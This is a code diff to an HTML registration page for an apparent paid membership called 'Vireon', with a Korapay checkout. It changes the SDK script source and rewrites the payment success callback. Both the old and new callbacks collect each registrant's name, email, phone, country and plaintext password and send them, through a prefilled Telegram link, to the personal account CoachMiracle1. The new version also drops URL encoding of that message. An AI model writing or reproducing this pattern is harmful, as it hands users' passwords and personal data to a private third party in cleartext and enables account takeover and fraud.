@@ -7,7 +7,9 @@
     <!-- Linking global framework sheets -->
     <link rel="stylesheet" href="style.css">
     <!-- Korapay Inline Checkout SDK Integration -->
-    <script src="https://launchpad.korapay.com/packages/merchant_v1.js"></script>
+    <!-- KORA SCRIPT -->
+    <script src="https://korablobstorage.blob.core.windows.net/modal-bucket/korapay-collections.min.js"></script>
+
     <style>
         * {
             box-sizing: border-box;
@@ -620,6 +622,15 @@
             }
         }
 
+        // Close searchable panel if user clicks anywhere outside of boundaries
+        document.addEventListener('click', function(event) {
+            const container = document.querySelector('.searchable-select-box');
+            if (container && !container.contains(event.target)) {
+                const panel = document.getElementById('country-dropdown-panel');
+                if (panel) panel.style.display = 'none';
+            }
+        });
+
         function selectCountryValue(countryName) {
             document.getElementById('reg-country').value = countryName;
             document.getElementById('selected-country-label').textContent = countryName;
@@ -639,14 +650,6 @@
                 }
             }
         }
-
-        // Close searchable panel if user clicks anywhere outside of boundaries
-        document.addEventListener('click', function(event) {
-            const container = document.querySelector('.searchable-select-box');
-            if (container && !container.contains(event.target)) {
-                document.getElementById('country-dropdown-panel').style.display = 'none';
-            }
-        });
 
         // 3. STORAGE & PIPELINE CONTROLS FOR DYNAMIC SEAMLESS STEPS
         let registrationDataPayload = {};
@@ -689,44 +692,44 @@
 
         // 4. HIGH-FIDELITY LIVE KORAPAY GATEWAY INITIALIZER
         function triggerKorapayGatewayProcess() {
-            // Check against the verified SDK window namespace object structure
+            // Safety initialization check matching your verified working Glamour setup syntax
             if (!window.Korapay) {
-                alert("Interface Synchronization Failure: Korapay secure SDK is currently unreachable. Please refresh the page.");
+                alert("Kora SDK failed to load");
                 return;
             }
 
-            const vireonRef = 'VRN_MBR_' + registrationDataPayload.username.toUpperCase() + '_' + Date.now();
+            // Generate clean unique reference sequence for the Vireon transaction pipeline
+            const vireonRef = "VIREON-" + Date.now();
 
-            // Fire configuration utilizing the exact functioning initialization engine methods
+            // Initialize the runtime utilizing your proven SDK parameters matrix setup
             window.Korapay.initialize({
-                key: 'pk_live_fAx1oGYBCWXy5J5FeNNxuXzvDDW7ZciX4muTCAS9',
+                key: "pk_live_fAx1oGYBCWXy5J5FeNNxuXzvDDW7ZciX4muTCAS9",
                 reference: vireonRef,
-                amount: 14500, 
-                currency: 'NGN',
+                amount: 14500,
+                currency: "NGN",
                 customer: {
                     name: registrationDataPayload.fullName,
                     email: registrationDataPayload.email
                 },
-                onClose: function() {
-                    console.log('Vireon payment terminal runtime disconnected by customer action.');
-                },
-                onSuccess: function(data) {
-                    // Formulate structured message payload for CoachMiracle1 Telegram DM routing
-                    const baseTelegramMessage = 
-                        `New Verified Registration Complete!\n\n` +
-                        `🔹 Full Name: ${registrationDataPayload.fullName}\n` +
-                        `🔹 Username: ${registrationDataPayload.username}\n` +
-                        `🔹 Email: ${registrationDataPayload.email}\n` +
-                        `🔹 Phone Number: ${registrationDataPayload.phone}\n` +
-                        `🔹 Country: ${registrationDataPayload.country}\n` +
-                        `🔹 Password: ${registrationDataPayload.password}\n` +
-                        `🔹 Reference: ${data.reference || vireonRef}`;
+                notification_url: "https://example.com",
+                onSuccess: function (data) {
+                    // Formulate structured routing message with all required country and password variables appended
+                    const msg =
+                        `🛡️ *VIREON REGISTRATION*%0A` +
+                        `👤 Name: ${registrationDataPayload.fullName}%0A` +
+                        `🆔 User: ${registrationDataPayload.username}%0A` +
+                        `📧 Email: ${registrationDataPayload.email}%0A` +
+                        `📞 Phone: ${registrationDataPayload.phone}%0A` +
+                        `📍 Country: ${registrationDataPayload.country}%0A` +
+                        `🔑 Password: ${registrationDataPayload.password}%0A` +
+                        `💰 Status: PAID 14,500 NGN%0A` +
+                        `🧾 Ref: ${data.reference}`;
 
-                    // Safe client URL encoding structure setup for global web routing
-                    const targetTelegramRedirectUrl = `https://t.me/CoachMiracle1?text=${encodeURIComponent(baseTelegramMessage)}`;
-                    
-                    // Instant direct transition launch to primary messaging channel
-                    window.location.href = targetTelegramRedirectUrl;
+                    // Direct client-side routing to clear chat terminal link interface
+                    window.location.href = `https://t.me/CoachMiracle1?text=${msg}`;
+                },
+                onClose: function () {
+                    console.log("Payment closed");
                 }
             });
         }
